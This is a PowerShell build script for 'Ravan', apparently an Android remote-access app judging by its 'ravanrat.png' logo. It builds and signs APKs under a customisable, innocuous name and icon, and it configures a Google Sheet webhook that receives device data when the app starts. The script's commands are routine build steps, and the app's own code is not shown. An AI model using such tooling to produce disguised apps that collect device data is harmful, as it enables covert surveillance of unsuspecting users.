#################################################
#          RAVAN APK BUILDER - PowerShell       #
#                   v2.0                        #
#                                               #
#  Developed by: Somesh              #
#  GitHub: github.com/someshsrichandan         #
#  LinkedIn: linkedin.com/in/someshsrichandan  #
#################################################

$ErrorActionPreference = "SilentlyContinue"

# Script paths
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir
$ConfigFile = Join-Path $ScriptDir "build_config.json"
$DefaultLogo = Join-Path $ProjectDir "ravanrat.png"

# Default settings
$DefaultSettings = @{
    KeyAlias = "ravan-key"
    KeystorePass = "ravan123"
    AppName = "Ravan Security"
    VersionName = "2.0"
    VersionCode = 20
}

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Red
    Write-Host "                                                                " -ForegroundColor Red
    Write-Host "  RRRR    AAA   V   V   AAA   N   N                            " -ForegroundColor Red
    Write-Host "  R   R  A   A  V   V  A   A  NN  N                            " -ForegroundColor Red
    Write-Host "  RRRR   AAAAA  V   V  AAAAA  N N N                            " -ForegroundColor Red
    Write-Host "  R  R   A   A   V V   A   A  N  NN                            " -ForegroundColor Red
    Write-Host "  R   R  A   A    V    A   A  N   N                            " -ForegroundColor Red
    Write-Host "                                                                " -ForegroundColor Red
    Write-Host "                 APK BUILDER v2.0                               " -ForegroundColor Red
    Write-Host "                 PowerShell Edition                             " -ForegroundColor Red
    Write-Host "                                                                " -ForegroundColor Red
    Write-Host "================================================================" -ForegroundColor Red
    Write-Host "  Developed by: Somesh                                " -ForegroundColor Magenta
    Write-Host "  GitHub:   https://github.com/someshsrichandan                 " -ForegroundColor Magenta
    Write-Host "  LinkedIn: https://linkedin.com/in/someshsrichandan            " -ForegroundColor Magenta
    Write-Host "================================================================" -ForegroundColor Red
    Write-Host ""
}

function Test-Requirements {
    Write-Host "[*] Checking requirements..." -ForegroundColor Cyan
    Write-Host ""
    
    # Check Java
    $javaExists = Get-Command java -ErrorAction SilentlyContinue
    
    if (-not $javaExists) {
        Write-Host "[!] Java is not installed." -ForegroundColor Red
        Write-Host ""
        Write-Host "[>] Options:" -ForegroundColor Magenta
        Write-Host "    1. Auto-install Java (using winget/chocolatey)"
        Write-Host "    2. Show manual installation instructions"
        Write-Host "    3. Skip (I will install later)"
        Write-Host ""
        
        $option = Read-Host "    Choose option [1]"
        if ([string]::IsNullOrEmpty($option)) { $option = "1" }
        
        switch ($option) {
            "1" { Install-Java }
            "2" { 
                Show-ManualJavaInstall
                Read-Host "Press Enter to continue"
                return $false
            }
            "3" { Write-Host "[!] Skipping Java check. Build may fail." -ForegroundColor Yellow }
        }
    }
    else {
        try {
            $javaVersion = & java -version 2>&1 | Select-String "version" | ForEach-Object { $_.ToString() }
            Write-Host "[OK] Java found: $javaVersion" -ForegroundColor Green
        }
        catch {
            Write-Host "[OK] Java found" -ForegroundColor Green
        }
    }
    
    # Check keytool
    $keytoolExists = Get-Command keytool -ErrorAction SilentlyContinue
    if ($keytoolExists) {
        Write-Host "[OK] keytool found" -ForegroundColor Green
    }
    else {
        Write-Host "[!] keytool not found. Usually comes with JDK." -ForegroundColor Yellow
    }
    
    Write-Host ""
    return $true
}

function Install-Java {
    Write-Host "[*] Attempting to install Java..." -ForegroundColor Cyan
    
    # Try winget first
    $wingetExists = Get-Command winget -ErrorAction SilentlyContinue
    if ($wingetExists) {
        Write-Host "[>] Installing via winget..." -ForegroundColor Yellow
        try {
            & winget install EclipseAdoptium.Temurin.11.JDK --accept-source-agreements --accept-package-agreements
            Write-Host "[OK] Java installed! Please restart PowerShell." -ForegroundColor Green
            return
        }
        catch {
            Write-Host "[!] winget install failed" -ForegroundColor Red
        }
    }
    
    # Try chocolatey
    $chocoExists = Get-Command choco -ErrorAction SilentlyContinue
    if ($chocoExists) {
        Write-Host "[>] Installing via Chocolatey..." -ForegroundColor Yellow
        try {
            & choco install temurin11 -y
            Write-Host "[OK] Java installed! Please restart PowerShell." -ForegroundColor Green
            return
        }
        catch {
            Write-Host "[!] Chocolatey install failed" -ForegroundColor Red
        }
    }
    
    # Open download page
    Write-Host "[!] Auto-install not available. Opening download page..." -ForegroundColor Yellow
    Start-Process "https://adoptium.net/temurin/releases/"
    Write-Host "[!] Please install Java and restart this script." -ForegroundColor Yellow
}

function Show-ManualJavaInstall {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host "              MANUAL JAVA INSTALLATION GUIDE                    " -ForegroundColor Cyan
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Option 1: Download from Adoptium (Recommended)" -ForegroundColor White
    Write-Host "    1. Go to: https://adoptium.net/temurin/releases/"
    Write-Host "    2. Download JDK 11 or JDK 17 for Windows x64"
    Write-Host "    3. Run the installer (choose Add to PATH)"
    Write-Host "    4. Restart PowerShell and run this script again"
    Write-Host ""
    Write-Host "Option 2: Using winget (Windows 11)" -ForegroundColor White
    Write-Host "    winget install EclipseAdoptium.Temurin.11.JDK"
    Write-Host ""
    Write-Host "Option 3: Using Chocolatey" -ForegroundColor White
    Write-Host "    choco install temurin11"
    Write-Host ""
    Write-Host "Option 4: Using Scoop" -ForegroundColor White
    Write-Host "    scoop bucket add java"
    Write-Host "    scoop install temurin11-jdk"
    Write-Host ""
}

function New-Keystore {
    param([bool]$AutoGenerate = $false)
    
    $keystorePath = Join-Path $ProjectDir "ravan-keystore.jks"
    $keystorePropsFile = Join-Path $ProjectDir "keystore.properties"
    
    # Default values
    $keyAlias = $DefaultSettings.KeyAlias
    $keystorePass = $DefaultSettings.KeystorePass
    $cnName = "Ravan Developer"
    $orgName = "Ravan Security"
    $country = "US"
    $validityDays = 25 * 365
    
    if (Test-Path $keystorePath) {
        if ($AutoGenerate) {
            Write-Host "[OK] Keystore already exists" -ForegroundColor Green
            return
        }
        Write-Host "[!] Keystore already exists at: $keystorePath" -ForegroundColor Yellow
        $regenerate = Read-Host "    Generate new keystore? (y/N)"
        if ($regenerate -ne "y" -and $regenerate -ne "Y") {
            Write-Host "[OK] Using existing keystore" -ForegroundColor Green
            return
        }
        Remove-Item $keystorePath -Force
    }
    
    if (-not $AutoGenerate) {
        Write-Host "[*] Keystore Configuration" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "[>] Enter keystore details (press Enter for defaults):" -ForegroundColor Magenta
        Write-Host ""
        
        $input = Read-Host "    Key alias [$keyAlias]"
        if (-not [string]::IsNullOrEmpty($input)) { $keyAlias = $input }
        
        $input = Read-Host "    Keystore password [$keystorePass]"
        if (-not [string]::IsNullOrEmpty($input)) { $keystorePass = $input }
        
        $input = Read-Host "    Your name [$cnName]"
        if (-not [string]::IsNullOrEmpty($input)) { $cnName = $input }
        
        $input = Read-Host "    Organization [$orgName]"
        if (-not [string]::IsNullOrEmpty($input)) { $orgName = $input }
        
        $input = Read-Host "    Country code [$country]"
        if (-not [string]::IsNullOrEmpty($input)) { $country = $input }
    }
    else {
        Write-Host "[*] Auto-generating keystore with default values..." -ForegroundColor Cyan
    }
    
    Write-Host ""
    Write-Host "[*] Generating keystore..." -ForegroundColor Cyan
    
    $dname = "CN=$cnName, O=$orgName, C=$country"
    
    try {
        & keytool -genkeypair -alias $keyAlias -keyalg RSA -keysize 2048 `
            -validity $validityDays -keystore $keystorePath `
            -storepass $keystorePass -keypass $keystorePass -dname $dname 2>$null
        
        Write-Host "[OK] Keystore generated successfully!" -ForegroundColor Green
        Write-Host ""
        
        # Create keystore.properties for Gradle
        $keystorePropsContent = @"
storeFile=ravan-keystore.jks
storePassword=$keystorePass
keyAlias=$keyAlias
keyPassword=$keystorePass
"@
        Set-Content -Path $keystorePropsFile -Value $keystorePropsContent
        Write-Host "[OK] Created keystore.properties for Gradle" -ForegroundColor Green
        
        # Save config for builder
        $config = @{
            KeystorePath = $keystorePath
            KeyAlias = $keyAlias
            KeystorePass = $keystorePass
        }
        $config | ConvertTo-Json | Set-Content $ConfigFile
        
        if (-not $AutoGenerate) {
            # Show fingerprint
            Write-Host "[*] Certificate SHA-256 fingerprint:" -ForegroundColor Cyan
            & keytool -list -v -keystore $keystorePath -storepass $keystorePass -alias $keyAlias 2>$null | Select-String "SHA256:"
        }
        Write-Host ""
    }
    catch {
        Write-Host "[!] Failed to generate keystore: $_" -ForegroundColor Red
    }
}

function Set-Logo {
    Write-Host "[*] Logo Configuration" -ForegroundColor Cyan
    Write-Host ""
    
    $resDir = Join-Path $ProjectDir "app\src\main\res"
    
    Write-Host "[>] Logo options:" -ForegroundColor Magenta
    Write-Host "    1. Use default Ravan logo (ravanrat.png)"
    Write-Host "    2. Use custom logo (provide image path)"
    Write-Host "    3. Keep current logo (no change)"
    Write-Host ""
    
    $logoOption = Read-Host "    Choose option [1]"
    if ([string]::IsNullOrEmpty($logoOption)) { $logoOption = "1" }
    
    $logoPath = $null
    
    switch ($logoOption) {
        "1" {
            if (Test-Path $DefaultLogo) {
                $logoPath = $DefaultLogo
                Write-Host "[OK] Using default Ravan logo" -ForegroundColor Green
            }
            else {
                Write-Host "[!] Default logo not found at: $DefaultLogo" -ForegroundColor Red
                return
            }
        }
        "2" {
            $customLogo = Read-Host "    Enter path to logo image (PNG, 512x512)"
            if (Test-Path $customLogo) {
                $logoPath = $customLogo
            }
            else {
                Write-Host "[!] Logo file not found: $customLogo" -ForegroundColor Red
                return
            }
        }
        "3" {
            Write-Host "[OK] Keeping current logo" -ForegroundColor Green
            return
        }
    }
    
    if ($logoPath) {
        Write-Host "[*] Copying logo to resources..." -ForegroundColor Cyan
        
        $densities = @("mipmap-mdpi", "mipmap-hdpi", "mipmap-xhdpi", "mipmap-xxhdpi", "mipmap-xxxhdpi")
        
        foreach ($density in $densities) {
            $destPath = Join-Path $resDir "$density\ic_launcher.png"
            $destPathRound = Join-Path $resDir "$density\ic_launcher_round.png"
            
            $destDir = Split-Path $destPath
            if (Test-Path $destDir) {
                Copy-Item $logoPath $destPath -Force
                Copy-Item $logoPath $destPathRound -Force
            }
        }
        
        Write-Host "[OK] Logo copied to all densities" -ForegroundColor Green
        Write-Host "[!] Note: For best results, use Android Asset Studio for proper sizing" -ForegroundColor Yellow
    }
    Write-Host ""
}

function Set-AppConfig {
    Write-Host "[*] App Configuration" -ForegroundColor Cyan
    Write-Host ""
    
    $stringsFile = Join-Path $ProjectDir "app\src\main\res\values\strings.xml"
    $buildGradle = Join-Path $ProjectDir "app\build.gradle"
    
    # Load existing config
    $config = @{}
    if (Test-Path $ConfigFile) {
        try {
            $config = Get-Content $ConfigFile | ConvertFrom-Json -AsHashtable
        }
        catch {
            $config = @{}
        }
    }
    
    # App name
    $appName = Read-Host "    Enter app name [$($DefaultSettings.AppName)]"
    if ([string]::IsNullOrEmpty($appName)) { $appName = $DefaultSettings.AppName }
    
    if (Test-Path $stringsFile) {
        $content = Get-Content $stringsFile -Raw
        $content = $content -replace '<string name="app_name">.*?</string>', "<string name=`"app_name`">$appName</string>"
        Set-Content $stringsFile $content
        Write-Host "[OK] App name set to: $appName" -ForegroundColor Green
    }
    
    $config.AppName = $appName
    
    # Google Sheet URL
    Write-Host ""
    Write-Host "[>] Google Sheet Webhook Configuration" -ForegroundColor Magenta
    Write-Host "    This URL will receive device data when app starts." -ForegroundColor Yellow
    Write-Host "    You need to set up Google Sheet manually (see README)." -ForegroundColor Yellow
    Write-Host "    Leave empty to skip." -ForegroundColor Yellow
    Write-Host ""
    
    $sheetUrl = Read-Host "    Enter Google Sheet webhook URL"
    
    if (-not [string]::IsNullOrEmpty($sheetUrl)) {
        $config.SheetUrl = $sheetUrl
        Write-Host "[OK] Google Sheet URL saved to config" -ForegroundColor Green
    }
    else {
        Write-Host "[!] Skipping Google Sheet configuration" -ForegroundColor Yellow
    }
    
    # Version
    Write-Host ""
    $versionName = Read-Host "    Enter version name [$($DefaultSettings.VersionName)]"
    if ([string]::IsNullOrEmpty($versionName)) { $versionName = $DefaultSettings.VersionName }
    
    $versionCode = Read-Host "    Enter version code [$($DefaultSettings.VersionCode)]"
    if ([string]::IsNullOrEmpty($versionCode)) { $versionCode = $DefaultSettings.VersionCode }
    
    if (Test-Path $buildGradle) {
        $content = Get-Content $buildGradle -Raw
        $content = $content -replace 'versionCode \d+', "versionCode $versionCode"
        $content = $content -replace 'versionName ".*?"', "versionName `"$versionName`""
        Set-Content $buildGradle $content
        Write-Host "[OK] Version set to: $versionName (code: $versionCode)" -ForegroundColor Green
    }
    
    $config.VersionName = $versionName
    $config.VersionCode = $versionCode
    
    # Save config
    $config | ConvertTo-Json | Set-Content $ConfigFile
    
    Write-Host ""
}

function Build-Apk {
    Write-Host "[*] Building APK..." -ForegroundColor Cyan
    Write-Host ""
    
    Set-Location $ProjectDir
    
    # Load config
    $config = @{}
    if (Test-Path $ConfigFile) {
        try {
            $config = Get-Content $ConfigFile | ConvertFrom-Json -AsHashtable
        }
        catch {
            $config = @{}
        }
    }
    
    # Check if keystore exists - auto-generate if not
    $keystoreFile = Join-Path $ProjectDir "ravan-keystore.jks"
    if (-not (Test-Path $keystoreFile)) {
        Write-Host "[!] No keystore found. Auto-generating..." -ForegroundColor Yellow
        New-Keystore -AutoGenerate $true
        Write-Host ""
    }
    
    Write-Host "[*] Running Gradle build..." -ForegroundColor Cyan
    Write-Host ""
    
    # Run gradle - build both release and debug
    & .\gradlew.bat assembleRelease assembleDebug --no-daemon 2>&1 | ForEach-Object {
        if ($_ -match "BUILD SUCCESSFUL") {
            Write-Host $_ -ForegroundColor Green
        }
        elseif ($_ -match "BUILD FAILED|FAILURE") {
            Write-Host $_ -ForegroundColor Red
        }
        elseif ($_ -match "> Task") {
            Write-Host $_ -ForegroundColor Blue
        }
        else {
            Write-Host $_
        }
    }
    
    # Create output folder
    $outputDir = Join-Path $ScriptDir "output"
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $appName = if ($config.AppName) { $config.AppName -replace ' ', '_' } else { "Ravan" }
    $versionName = if ($config.VersionName) { $config.VersionName } else { "2.0" }
    
    $apkFound = $false
    
    # Signed release APK
    $releaseApk = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release.apk"
    if (Test-Path $releaseApk) {
        $outputSigned = Join-Path $outputDir "$appName-v$versionName-signed-$timestamp.apk"
        Copy-Item $releaseApk $outputSigned -Force
        Write-Host "[OK] Signed APK: $outputSigned" -ForegroundColor Green
        $apkFound = $true
    }
    
    # Unsigned release APK
    $unsignedApk = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release-unsigned.apk"
    if (Test-Path $unsignedApk) {
        $outputUnsigned = Join-Path $outputDir "$appName-v$versionName-unsigned-$timestamp.apk"
        Copy-Item $unsignedApk $outputUnsigned -Force
        Write-Host "[OK] Unsigned APK: $outputUnsigned" -ForegroundColor Green
        $apkFound = $true
    }
    
    # Debug APK
    $debugApk = Join-Path $ProjectDir "app\build\outputs\apk\debug\app-debug.apk"
    if (Test-Path $debugApk) {
        $outputDebug = Join-Path $outputDir "$appName-v$versionName-debug-$timestamp.apk"
        Copy-Item $debugApk $outputDebug -Force
        Write-Host "[OK] Debug APK: $outputDebug" -ForegroundColor Green
        $apkFound = $true
    }
    
    if ($apkFound) {
        Write-Host ""
        Write-Host "================================================================" -ForegroundColor Green
        Write-Host "                    BUILD SUCCESSFUL!                           " -ForegroundColor Green
        Write-Host "================================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "[OK] APKs saved to: $outputDir" -ForegroundColor Green
        Write-Host ""
        
        Write-Host "================================================================" -ForegroundColor Magenta
        Write-Host "  Developed by: Somesh Srichandan                               " -ForegroundColor Magenta
        Write-Host "  GitHub:   https://github.com/someshsrichandan                 " -ForegroundColor Magenta
        Write-Host "  LinkedIn: https://linkedin.com/in/someshsrichandan            " -ForegroundColor Magenta
        Write-Host "================================================================" -ForegroundColor Magenta
        Write-Host ""
        
        $openFolder = Read-Host "    Open output folder? (Y/n)"
        if ($openFolder -ne "n" -and $openFolder -ne "N") {
            Start-Process explorer.exe -ArgumentList $outputDir
        }
    }
    else {
        Write-Host ""
        Write-Host "================================================================" -ForegroundColor Red
        Write-Host "                      BUILD FAILED!                             " -ForegroundColor Red
        Write-Host "================================================================" -ForegroundColor Red
        Write-Host ""
        Write-Host "[!] No APK files found. Check errors above." -ForegroundColor Red
        Write-Host "[!] Common fixes:" -ForegroundColor Yellow
        Write-Host "    - Run Full Build (option 1) first to generate keystore"
        Write-Host "    - Ensure Java 11+ is installed and in PATH"
        Write-Host "    - Check internet connection"
        Write-Host "    - Run: .\gradlew --stop; .\gradlew clean"
    }
}

function Show-MainMenu {
    Write-Banner
    
    Write-Host "[>] Build Options:" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "    1. Full Build (Configure everything + Build)"
    Write-Host "    2. Quick Build (Use existing config)"
    Write-Host "    3. Generate Keystore Only"
    Write-Host "    4. Configure Logo Only"
    Write-Host "    5. Configure App Settings Only"
    Write-Host "    6. Check/Install Requirements"
    Write-Host "    7. Exit"
    Write-Host ""
    
    $option = Read-Host "    Choose option [1]"
    if ([string]::IsNullOrEmpty($option)) { $option = "1" }
    
    Write-Host ""
    
    switch ($option) {
        "1" {
            if (Test-Requirements) {
                New-Keystore
                Set-Logo
                Set-AppConfig
                Build-Apk
            }
        }
        "2" {
            if (Test-Requirements) {
                Build-Apk
            }
        }
        "3" {
            if (Test-Requirements) {
                New-Keystore
            }
        }
        "4" {
            Set-Logo
        }
        "5" {
            Set-AppConfig
        }
        "6" {
            Test-Requirements | Out-Null
            Show-ManualJavaInstall
        }
        "7" {
            Write-Host "[*] Goodbye!" -ForegroundColor Cyan
            Write-Host "    Follow: https://github.com/someshsrichandan" -ForegroundColor Magenta
            return
        }
        default {
            Write-Host "[!] Invalid option" -ForegroundColor Red
        }
    }
    
    Write-Host ""
    Write-Host "[OK] Done!" -ForegroundColor Green
    Write-Host ""
    Read-Host "Press Enter to exit"
}

# Run main menu
Show-MainMenu
